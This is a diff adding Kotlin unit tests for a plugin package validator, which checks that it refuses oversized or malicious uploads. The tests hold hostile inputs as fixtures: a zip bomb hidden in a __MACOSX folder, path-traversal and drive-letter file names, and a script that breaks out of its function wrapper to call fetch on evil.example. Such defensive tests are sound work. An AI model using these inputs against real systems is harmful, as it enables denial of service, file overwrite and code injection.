@@ -46,6 +46,21 @@ class PluginPackageTest {
     }
 
     @Test
+    fun whatAZipLeavesOutCountsInItsSize() {
+        // 11 MB of zeros, a few kilobytes once deflated, in a folder that is left out.
+        val bomb = zip(files + ("__MACOSX/x" to ByteArray(11 * 1024 * 1024)))
+        assertTrue(bomb.size < 1024 * 1024)
+        assertTrue("bigger than" in refused { PluginPackage.fromZip(bomb) })
+    }
+
+    @Test
+    fun aNameWithBackslashesOrADriveIsRefused() {
+        refused { PluginPackage.fromZip(zip(files + ("..\\evil.js" to byteArrayOf()))) }
+        refused { PluginPackage.fromZip(zip(files + ("C:/evil.js" to byteArrayOf()))) }
+        refused { PluginPackage.fromFiles(files + ("C:evil.js" to byteArrayOf())) }
+    }
+
+    @Test
     fun aScriptThatClosesItsFunctionIsRefused() {
         val escaping = files + ("plugin.js" to "}); fetch('https://evil.example/'); (function () {".encodeToByteArray())
         assertTrue("closes the function" in refused { PluginPackage.fromFiles(escaping) })
